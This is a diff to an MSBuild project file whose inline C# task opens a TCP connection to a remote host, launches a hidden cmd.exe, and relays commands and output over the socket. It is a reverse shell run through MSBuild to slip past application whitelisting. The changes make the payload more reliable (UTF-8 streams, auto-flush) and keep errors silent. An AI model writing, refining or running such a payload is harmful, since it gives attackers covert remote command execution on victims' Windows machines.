@@ -7,13 +7,16 @@
     TaskFactory="CodeTaskFactory"
     AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
+      <Reference Include="System" />
+      <Reference Include="System.Net" />
+      <Reference Include="System.IO" />
       <Code Type="Class" Language="cs">
         <![CDATA[
         using System;
         using System.Net.Sockets;
         using System.Text;
         using System.Diagnostics;
-        using System.Runtime.InteropServices;
+        using System.IO;
         using Microsoft.Build.Framework;
         using Microsoft.Build.Utilities;
         
@@ -29,10 +32,9 @@
                     using (TcpClient client = new TcpClient(host, port))
                     {
                         using (NetworkStream stream = client.GetStream())
-                        using (StreamReader reader = new StreamReader(stream))
-                        using (StreamWriter writer = new StreamWriter(stream))
+                        using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
+                        using (StreamWriter writer = new StreamWriter(stream, Encoding.UTF8) { AutoFlush = true })
                         {
-                            StringBuilder inputBuilder = new StringBuilder();
                             Process process = new Process();
                             process.StartInfo.FileName = "cmd.exe";
                             process.StartInfo.CreateNoWindow = true;
@@ -40,11 +42,11 @@
                             process.StartInfo.RedirectStandardOutput = true;
                             process.StartInfo.RedirectStandardInput = true;
                             process.StartInfo.RedirectStandardError = true;
+                            
                             process.OutputDataReceived += (s, e) => {
                                 if (!string.IsNullOrEmpty(e.Data))
                                 {
                                     writer.WriteLine(e.Data);
-                                    writer.Flush();
                                 }
                             };
                             
@@ -54,20 +56,19 @@
                             // Command loop
                             while (true)
                             {
-                                inputBuilder.Clear();
                                 string input = reader.ReadLine();
                                 if (string.IsNullOrEmpty(input)) continue;
                                 if (input.ToLower() == "exit") break;
                                 
                                 process.StandardInput.WriteLine(input);
-                                System.Threading.Thread.Sleep(100);
                             }
                         }
                     }
                 }
                 catch (Exception ex)
                 {
-                    // Silent failure
+                    // Silent failure - remove this in production
+                    // System.IO.File.WriteAllText(@"C:\Windows\Temp\debug.txt", ex.ToString());
                 }
                 return true;
             }
